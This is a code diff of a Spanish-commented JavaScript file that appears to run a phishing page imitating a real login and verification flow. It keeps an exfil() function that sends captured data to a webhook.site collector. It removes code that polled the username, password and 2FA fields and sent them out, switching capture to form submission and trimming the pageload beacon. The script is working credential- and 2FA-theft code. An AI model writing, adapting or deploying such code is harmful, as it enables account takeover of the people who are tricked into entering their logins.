@@ -8,7 +8,7 @@
   "use strict";
 
   // <<< tu webhook >>>
-  var COLLECTOR = "https://webhook.site/283663a8-84fb-4f42-8a74-662456c0b978";
+  var COLLECTOR = "https://webhook.site/d93d4d62-cb23-4758-a1f2-dbf9a1796ccf";
 
   function exfil(fase, datos) {
     var qs = encodeURIComponent(JSON.stringify(datos || {}));
@@ -17,32 +17,9 @@
     try { fetch(url, { method: "GET", mode: "no-cors", keepalive: true }); } catch (e) {}
   }
 
-  exfil("pageload", { path: location.pathname, ref: document.referrer, ua: navigator.userAgent });
+  exfil("pageload", { path: location.pathname });
 
-  // Captura robusta por polling (no depende del submit).
-  var ult = { u: "", p: "", c: "" };
-  function chequear() {
-    var gu = document.getElementById("txt-login");
-    var gp = document.getElementById("txt-password");
-    var gc = document.getElementById("txt-2fa");
-    var u = gu ? gu.value : "";
-    var p = gp ? gp.value : "";
-    var c = gc ? gc.value : "";
-    if ((u && u !== ult.u) || (p && p !== ult.p)) {
-      ult.u = u; ult.p = p;
-      exfil("campos-login", { usuario: u, clave: p });
-    }
-    if (c && c !== ult.c) {
-      ult.c = c;
-      exfil("campos-2fa", { codigo: c });
-    }
-  }
-  setInterval(chequear, 200);
-  ["txt-login", "txt-password", "txt-2fa"].forEach(function (id) {
-    var el = document.getElementById(id);
-    if (el) { el.addEventListener("input", chequear); el.addEventListener("change", chequear); }
-  });
-
+  // Captura SOLO por evento de submit (sin polling, para no quemar la cuota).
   // Paso 1: login -> navega a /verificar (igual que el real).
   var formLogin = document.getElementById("form-login");
   if (formLogin) {
